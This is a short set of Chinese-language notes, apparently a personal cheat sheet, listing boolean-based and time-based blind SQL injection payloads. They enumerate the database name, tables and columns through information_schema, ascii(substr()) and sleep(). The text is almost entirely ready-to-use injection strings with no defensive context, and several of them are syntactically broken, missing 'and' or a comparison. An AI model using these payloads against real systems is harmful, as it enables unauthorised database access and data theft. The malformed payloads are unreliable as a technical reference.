##### 基于布尔的sql注入



1. 查库

   ```bash
   xxx' select length(database())>122#
   
   xxx' and ascii(substr(database(), 1, 1))>112#
   ```

2. 查表

   ```bash
   xxx' ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1,1))#
   ```

3. 查字段

   ```bash
   xxx' ascii(substr((select column_name from information_schema.columns where table_schema=database() limit 0,1), 1, 1))#
   ```

   



##### 基于时间延迟的sql注入

1. 查库

```bash
xxx' and if((substr(database(), 1, 1))='a', sleep(5),null)#
```

